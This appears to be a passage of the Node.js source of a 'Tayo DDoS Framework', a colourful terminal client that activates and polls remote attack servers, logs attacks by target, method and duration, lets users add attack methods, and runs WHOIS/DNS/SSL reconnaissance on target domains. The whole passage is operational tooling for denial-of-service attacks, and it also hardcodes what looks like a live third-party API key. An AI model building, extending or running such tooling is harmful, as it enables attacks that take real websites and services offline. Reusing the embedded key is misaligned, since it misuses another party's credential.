        console.log(colors.redBright('║') + ' ' + colors.yellowBright('🎯 API:') + ' ' + colors.greenBright(method) + '                                ' + colors.redBright('║'));
        console.log(colors.redBright('║') + ' ' + colors.yellowBright('🔗 Full Endpoint:') + ' ' + colors.greenBright(url + method) + '           ' + colors.redBright('║'));
        console.log(colors.redBright('║') + ' ' + colors.yellowBright('⚡ Status:') + ' ' + colors.redBright('INACTIVE - Use "switch" to activate') + ' ' + colors.redBright('║'));
        console.log(colors.redBright('╚══════════════════════════════════════════════════════════╝'));
    }

    generateServerName(url) {
        // Extract meaningful name from URL
        const urlObj = new URL(url);
        const hostname = urlObj.hostname;
        
        if (hostname === 'localhost' || hostname.startsWith('192.168.') || hostname.startsWith('10.')) {
            return 'LOCAL SERVER';
        } else if (hostname.includes('.')) {
            const parts = hostname.split('.');
            return parts[parts.length - 2].toUpperCase() + ' SERVER';
        } else {
            return 'REMOTE SERVER';
        }
    }

    async switchServer(args) {
        if (args.length < 1) {
            console.log(colors.redBright('❌ Usage: switch <server_number|all>'));
            console.log(colors.yellowBright('💡 Examples:'));
            console.log(colors.greenBright('  switch 1    - Activate server 1'));
            console.log(colors.greenBright('  switch all  - Activate all servers'));
            console.log(colors.greenBright('  switch 1,3  - Activate servers 1 and 3'));
            console.log(colors.yellowBright('💡 Run "servers" to see available servers'));
            return;
        }

        const command = args[0].toLowerCase();

        if (command === 'all') {
            // Activate all servers
            this.servers.forEach(server => {
                server.active = true;
            });
            
            console.log(colors.redBright('╔══════════════════════════════════════════════════════════╗'));
            console.log(colors.redBright('║') + ' ' + colors.greenBright('✅ ALL SERVERS ACTIVATED!') + '                      ' + colors.redBright('║'));
            console.log(colors.redBright('╠══════════════════════════════════════════════════════════╣'));
            console.log(colors.redBright('║') + ' ' + colors.yellowBright('🌐 Total Servers:') + ' ' + colors.greenBright(this.servers.length) + '                          ' + colors.redBright('║'));
            this.servers.forEach((server, index) => {
                console.log(colors.redBright('║') + ' ' + colors.greenBright(`${index + 1}.`) + ' ' + colors.white(server.name) + '        ' + colors.redBright('║'));
            });
            console.log(colors.redBright('╚══════════════════════════════════════════════════════════╝'));

        } else if (command.includes(',')) {
            // Handle multiple server selection (e.g., "switch 1,3,5")
            const serverNumbers = command.split(',').map(num => parseInt(num.trim()) - 1);
            const validServers = serverNumbers.filter(num => num >= 0 && num < this.servers.length);
            
            if (validServers.length === 0) {
                console.log(colors.redBright('❌ No valid server numbers provided!'));
                return;
            }

            // Deactivate all servers first
            this.servers.forEach(server => {
                server.active = false;
            });

            // Activate selected servers
            validServers.forEach(num => {
                this.servers[num].active = true;
            });

            console.log(chalk.hex('#FF4444')('╔══════════════════════════════════════════════════════════╗'));
            console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')(`✅ ${validServers.length} SERVERS ACTIVATED!`) + '                 ' + chalk.hex('#FF4444')('║'));
            console.log(chalk.hex('#FF4444')('╠══════════════════════════════════════════════════════════╣'));
            validServers.forEach(num => {
                const server = this.servers[num];
                console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')(`${num + 1}.`) + ' ' + chalk.hex('#FFFFFF')(server.name) + ' - ' + chalk.hex('#44FFFF')(server.url) + ' ' + chalk.hex('#FF4444')('║'));
            });
            console.log(chalk.hex('#FF4444')('╚══════════════════════════════════════════════════════════╝'));

        } else {
            // Handle single server selection
            const serverIndex = parseInt(command) - 1;

            if (serverIndex >= 0 && serverIndex < this.servers.length) {
                // Deactivate all servers first
                this.servers.forEach(server => {
                    server.active = false;
                });
                
                // Activate selected server
                this.servers[serverIndex].active = true;
                this.currentServer = serverIndex;
                this.baseUrl = this.servers[serverIndex].url;
                
                console.log(colors.redBright('╔══════════════════════════════════════════════════════════╗'));
                console.log(colors.redBright('║') + ' ' + colors.greenBright('✅ SERVER ACTIVATED!') + '                           ' + colors.redBright('║'));
                console.log(colors.redBright('╠══════════════════════════════════════════════════════════╣'));
                console.log(colors.redBright('║') + ' ' + colors.yellowBright('🏷️  Name:') + ' ' + colors.white(this.servers[serverIndex].name) + '     ' + colors.redBright('║'));
                console.log(colors.redBright('║') + ' ' + colors.yellowBright('🌐 URL:') + ' ' + colors.cyan(this.servers[serverIndex].url) + ' ' + colors.redBright('║'));
                console.log(colors.redBright('║') + ' ' + colors.yellowBright('🎯 API:') + ' ' + colors.greenBright(this.servers[serverIndex].method) + '                          ' + colors.redBright('║'));
                console.log(colors.redBright('║') + ' ' + colors.yellowBright('⚡ Status:') + ' ' + colors.greenBright('ACTIVE - Ready for attacks') + '       ' + colors.redBright('║'));
                console.log(colors.redBright('╚══════════════════════════════════════════════════════════╝'));
            } else {
                console.log(colors.redBright('❌ Invalid server number!'));
                console.log(colors.yellowBright('💡 Available servers:'));
                this.servers.forEach((server, index) => {
                    console.log(colors.greenBright(`  ${index + 1}. ${server.name}`));
                });
            }
        }
    }

    async showAttackHistory() {
        // Modern Tayo ASCII Art Banner for Attack History
        const tayoAttackBanner = [
            gradient.passion('╔══════════════════════════════════════════════════════════╗'),
            gradient.passion('║   ████████╗ █████╗ ██╗   ██╗ ██████╗   ║'),
            gradient.passion('║   ╚══██╔══╝██╔══██╗██║   ██║██╔═══██╗  ║'),
            gradient.passion('║      ██║   ███████║██║   ██║██║   ██║  ║'),
            gradient.passion('║      ██║   ██╔══██║╚██╗ ██╔╝██║   ██║  ║'),
            gradient.passion('║      ██║   ██║  ██║ ╚████╔╝ ╚██████╔╝  ║'),
            gradient.passion('║      ╚═╝   ╚═╝  ╚═╝  ╚═══╝   ╚═════╝   ║'),
            gradient.atlas('║         TAYO - ATTACK HISTORY 2025     ║'),
            gradient.atlas('║         Powered by Tayo                ║'),
            gradient.passion('╚══════════════════════════════════════════════════════════╝'),
            ''
        ].join('\n');
        console.log(tayoAttackBanner);

        if (this.attackHistory.length === 0) {
            console.log(gradient.passion('║') + ' ' + colors.yellowBright('No attacks recorded yet.') + ' '.repeat(40) + gradient.passion('║'));
            console.log(gradient.passion('║') + ' ' + colors.whiteBright('Launch your first attack with "attack" command.') + ' '.repeat(20) + gradient.passion('║'));
        } else {
            // Modern Table with icons and colors
            const table = new Table({
                head: [
                    colors.yellowBright('TIME'),
                    colors.yellowBright('TARGET'),
                    colors.yellowBright('METHOD'),
                    colors.yellowBright('DURATION'),
                    colors.yellowBright('SERVER'),
                    colors.yellowBright('STATUS'),
                    colors.yellowBright('ICON')
                ],
                colWidths: [8, 20, 12, 8, 15, 8, 8],
                chars: {
                    'top': gradient.passion('═'), 'top-mid': gradient.passion('╦'), 'top-left': gradient.passion('╔'), 'top-right': gradient.passion('╗'),
                    'bottom': gradient.passion('═'), 'bottom-mid': gradient.passion('╩'), 'bottom-left': gradient.passion('╚'), 'bottom-right': gradient.passion('╝'),
                    'left': gradient.passion('║'), 'left-mid': gradient.passion('╠'), 'mid': gradient.passion('═'), 'mid-mid': gradient.passion('╬'),
                    'right': gradient.passion('║'), 'right-mid': gradient.passion('╣'), 'middle': gradient.passion('║')
                }
            });

            // Status icons
            const statusIcons = {
                SUCCESS: '✅',
                FAILED: '❌'
            };

            this.attackHistory.slice(0, 10).forEach(attack => {
                table.push([
                    colors.cyanBright(attack.timestamp.split(' ')[1]),
                    colors.whiteBright(attack.target.length > 18 ? attack.target.substring(0, 15) + '...' : attack.target),
                    colors.greenBright(attack.method),
                    colors.yellowBright(attack.duration + 's'),
                    colors.magentaBright(attack.server.length > 12 ? attack.server.substring(0, 9) + '...' : attack.server),
                    attack.status === 'SUCCESS' ? colors.greenBright('SUCCESS') : colors.redBright('FAILED'),
                    attack.status === 'SUCCESS' ? statusIcons.SUCCESS : statusIcons.FAILED
                ]);
            });

            console.log(table.toString());

            // Show modern summary
            const successCount = this.attackHistory.filter(a => a.status === 'SUCCESS').length;
            const totalCount = this.attackHistory.length;
            const failedCount = totalCount - successCount;
            const successRate = totalCount > 0 ? ((successCount / totalCount) * 100).toFixed(1) : '0.0';

            console.log(gradient.passion('╔══════════════════════════════════════════════════════════╗'));
            console.log(gradient.passion('║') + ' ' + colors.greenBright(`📊 SUMMARY:`) + ' ' + colors.greenBright(`${successCount} successful`) + ' / ' + colors.redBright(`${failedCount} failed`) + ' / ' + colors.cyanBright(`${totalCount} total`) + ' | ' + colors.yellowBright(`Success Rate: ${successRate}%`) + ' ' + gradient.passion('║'));
            console.log(gradient.passion('╚══════════════════════════════════════════════════════════╝'));
        }
        // Modern tip and footer
        console.log(gradient.atlas('╔══════════════════════════════════════════════════════════╗'));
        console.log(gradient.atlas('║   Type "attack <url> <time> <method>" to start!         ║'));
        console.log(gradient.atlas('║   Enjoy the premium UI! Follow @Irfaty for updates.     ║'));
        console.log(gradient.atlas('╚══════════════════════════════════════════════════════════╝'));
    }

    async serverStatus() {
        const activeServers = this.servers.filter(server => server.active);
        
        if (activeServers.length === 0) {
            console.log(chalk.hex('#FF4444')('❌ No active servers! Use "switch" to activate servers.'));
            return;
        }

    const spinner = new Spinner(colors.greenBright(`📡 Fetching status for ${activeServers.length} servers... %s`));
        spinner.setSpinnerString('⣾⣽⣻⢿⡿⣟⣯⣷');
        spinner.start();

        try {
            const statusPromises = activeServers.map(async (server) => {
                try {
                    const response = await axios.get(`${server.url}/status`);
                    return { server: server.name, success: true, data: response.data };
                } catch (error) {
                    return { server: server.name, success: false, error: error.message };
                }
            });

            const results = await Promise.all(statusPromises);
            spinner.stop(true);

            console.log(chalk.hex('#FF4444')('╔══════════════════════════════════════════════════════════╗'));
            console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#FFFF44')(`📊 SERVER STATUS (${results.filter(r => r.success).length}/${activeServers.length})`) + '        ' + chalk.hex('#FF4444')('║'));
            console.log(chalk.hex('#FF4444')('╠══════════════════════════════════════════════════════════╣'));

            results.forEach(result => {
                if (result.success) {
                    const status = result.data.data;
                    // Normalisasi available_methods agar field selalu 'name', 'description', 'power'
                    if (status.capabilities && Array.isArray(status.capabilities.available_methods)) {
                        status.capabilities.available_methods = status.capabilities.available_methods.map(m => {
                            return {
                                name: m.name || m.nama || '',
                                description: m.description || m.deskripsi || '',
                                power: m.power || m.kekuatan || ''
                            };
                        });
                    }
                    console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('🟢') + ' ' + chalk.hex('#FFFF44')(result.server) + '                    ' + chalk.hex('#FF4444')('║'));
                    console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('  💾 Memory:') + ' ' + chalk.hex('#FFFFFF')(status.memory.usage) + '             ' + chalk.hex('#FF4444')('║'));
                    console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('  📊 CPU Load:') + ' ' + chalk.hex('#FFFFFF')(status.cpu.load) + '               ' + chalk.hex('#FF4444')('║'));
                    console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('  📈 Total Attacks:') + ' ' + chalk.hex('#44FF44')(status.stats.attacks) + '        ' + chalk.hex('#FF4444')('║'));
                    console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('  ──────────────────────────────') + '         ' + chalk.hex('#FF4444')('║'));
                } else {
                    console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#FF4444')('🔴') + ' ' + chalk.hex('#FFFF44')(result.server) + ' - ' + chalk.hex('#FF4444')('OFFLINE') + '         ' + chalk.hex('#FF4444')('║'));
                }
            });

            console.log(chalk.hex('#FF4444')('╚══════════════════════════════════════════════════════════╝'));

        } catch (error) {
            spinner.stop(true);
            console.log(colors.redBright('❌ Failed to fetch server status:'), error.message);
        }
    }

    async healthCheck() {
        const activeServers = this.servers.filter(server => server.active);
        
        if (activeServers.length === 0) {
            console.log(chalk.hex('#FF4444')('❌ No active servers! Use "switch" to activate servers.'));
            return;
        }

    const spinner = new Spinner(colors.greenBright(`❤️  Checking health for ${activeServers.length} servers... %s`));
        spinner.setSpinnerString('⣾⣽⣻⢿⡿⣟⣯⣷');
        spinner.start();

        try {
            const healthPromises = activeServers.map(async (server) => {
                try {
                    const response = await axios.get(`${server.url}/health`);
                    return { server: server.name, success: true, data: response.data };
                } catch (error) {
                    return { server: server.name, success: false, error: error.message };
                }
            });

            const results = await Promise.all(healthPromises);
            spinner.stop(true);

            const healthyCount = results.filter(r => r.success && r.data.status === 'healthy').length;

            console.log(chalk.hex('#FF4444')('╔══════════════════════════════════════════════════════════╗'));
            console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#FFFF44')(`❤️  SERVER HEALTH (${healthyCount}/${activeServers.length})`) + '               ' + chalk.hex('#FF4444')('║'));
            console.log(chalk.hex('#FF4444')('╠══════════════════════════════════════════════════════════╣'));

            results.forEach(result => {
                if (result.success) {
                    const health = result.data;
                    const status = health.status === 'healthy' ? chalk.hex('#44FF44')('🟢 HEALTHY') : chalk.hex('#FFFF44')('🟡 DEGRADED');
                    console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('🟢') + ' ' + chalk.hex('#FFFF44')(result.server) + ' - ' + status + '      ' + chalk.hex('#FF4444')('║'));
                } else {
                    console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#FF4444')('🔴') + ' ' + chalk.hex('#FFFF44')(result.server) + ' - ' + chalk.hex('#FF4444')('OFFLINE') + '         ' + chalk.hex('#FF4444')('║'));
                }
            });

            console.log(chalk.hex('#FF4444')('╚══════════════════════════════════════════════════════════╝'));

        } catch (error) {
            spinner.stop(true);
            console.log(chalk.hex('#FF4444')('❌ Health check failed:'), error.message);
        }
    }

    async serverInfo() {
        const activeServers = this.servers.filter(server => server.active);
        
        if (activeServers.length === 0) {
            console.log(chalk.hex('#FF4444')('❌ No active servers! Use "switch" to activate servers.'));
            return;
        }

        try {
            // Get info from first active server
            const firstActiveServer = activeServers[0];
            const response = await axios.get(`${firstActiveServer.url}/info`);
            const info = response.data;

            console.log(chalk.hex('#FF4444')('╔══════════════════════════════════════════════════════════╗'));
            console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#FFFF44')('🔍 SERVER INFORMATION') + '                         ' + chalk.hex('#FF4444')('║'));
            console.log(chalk.hex('#FF4444')('╠══════════════════════════════════════════════════════════╣'));
            console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('Server:') + ' ' + chalk.hex('#FFFFFF')(firstActiveServer.name) + '              ' + chalk.hex('#FF4444')('║'));
            console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('Name:') + ' ' + chalk.hex('#FFFFFF')(info.server.name) + '                      ' + chalk.hex('#FF4444')('║'));
            console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('Version:') + ' ' + chalk.hex('#FFFFFF')(info.server.version) + '                   ' + chalk.hex('#FF4444')('║'));
            console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('Platform:') + ' ' + chalk.hex('#FFFFFF')(info.server.platform) + '                 ' + chalk.hex('#FF4444')('║'));
            console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('Architecture:') + ' ' + chalk.hex('#FFFFFF')(info.server.architecture) + '            ' + chalk.hex('#FF4444')('║'));
            console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('Node.js:') + ' ' + chalk.hex('#FFFFFF')(info.server.node_version) + '               ' + chalk.hex('#FF4444')('║'));
            console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('Hostname:') + ' ' + chalk.hex('#FFFFFF')(info.server.hostname) + '                 ' + chalk.hex('#FF4444')('║'));
            console.log(chalk.hex('#FF4444')('╚══════════════════════════════════════════════════════════╝'));

        } catch (error) {
            console.log(colors.redBright('❌ Failed to get server info:'), error.message);
        }
    }

    exitTool() {
        console.log(chalk.hex('#FF4444')('\n╔══════════════════════════════════════════════════════════╗'));
        console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#44FF44')('👋 Thank you for using Tayo DDoS Framework!') + '     ' + chalk.hex('#FF4444')('║'));
        console.log(chalk.hex('#FF4444')('║') + ' ' + chalk.hex('#FFFF44')('📍 Use responsibly and ethically!') + '               ' + chalk.hex('#FF4444')('║'));
        console.log(chalk.hex('#6944ff')('╚══════════════════════════════════════════════════════════╝\n'));
        this.rl.close();
        process.exit(0);
    }

    async addMethod(args) {
        if (args.length < 3) {
            console.log(colors.redBright('❌ Usage: addmethod <name> <description> <power>'));
            console.log(colors.yellowBright('💡 Example: addmethod custom "Custom Attack" ★★★☆☆'));
            return;
        }
        const [name, description, power] = args;
        this.methodsList.push({ name, description, power });
        console.log(colors.greenBright(`✅ Method '${name}' added successfully!`));
    }

    async onsitMenu(domain) {
        const { WhoisJson } = require('@whoisjson/whoisjson');
        const whois = new WhoisJson({
            apiKey: '14c714d59956b1153f52bdca32471b4b7a2787201192c2e5d1b765b4792af126'
        });
        try {
            const whoisInfo = await whois.lookup(domain);
            console.log('WHOIS Info:', whoisInfo);
            const dnsInfo = await whois.nslookup(domain);
            console.log('DNS Info:', dnsInfo);
            const sslInfo = await whois.ssl(domain);
            console.log('SSL Info:', sslInfo);
            const availabilityInfo = await whois.checkDomainAvailability(domain);
            console.log('Domain Availability:', availabilityInfo);
        } catch (error) {
            console.error('Error:', error);
        }
    }
}

// Main execution
async function main() {
    try {
        const terminal = new TayoDDoSTerminal();
        await terminal.showAsciiBanner();
        await terminal.showWelcomeMessage();
        terminal.showTerminalPrompt();
    } catch (error) {
        console.log(colors.redBright('💥 Error starting terminal:'), error.message);
        process.exit(1);
    }
}

// Handle CTRL+C
process.on('SIGINT', () => {
    console.log(chalk.hex('#FFFF44')('\n👋 Goodbye!'));
    process.exit(0);
});

if (require.main === module) {
    (async () => {
        await preCheck();
        await main();
    })();
}

module.exports = TayoDDoSTerminal;
